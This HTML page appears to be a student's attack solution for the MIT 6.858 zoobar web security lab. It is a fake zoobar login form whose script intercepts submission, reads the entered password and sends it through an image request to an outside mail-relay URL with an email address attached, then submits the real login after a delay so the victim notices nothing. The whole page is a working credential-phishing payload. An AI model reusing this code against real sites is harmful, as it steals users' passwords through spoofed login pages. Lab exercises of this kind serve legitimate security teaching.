<div id="login" class="centerpiece">

<form id="42" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" id="pass" size=20 autocomplete="no">
  <input id="log" type="submit" name="submit_login" value="Log in">
  <input id="register" type="submit" name="submit_registration" value="Register"></td>
</tr>

</form>
</div>
<div class="footer warning">                                     

</div>

<script>document.loginform.login_username.focus();</script> 

<script type="text/javascript">

document.getElementById("42").addEventListener("submit", function(event){
fun(event)});

var t = 1;

function fun(event) {

  if (t == 1) {
    event.preventDefault();

    var pass = document.getElementById("pass").value;
    javascript:void((new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=markatou@mit.edu' + '&payload=' + pass);
    t = 4;
    setTimeout(function(){document.getElementById("42").submit();}, 5000);
  }
}

</script>
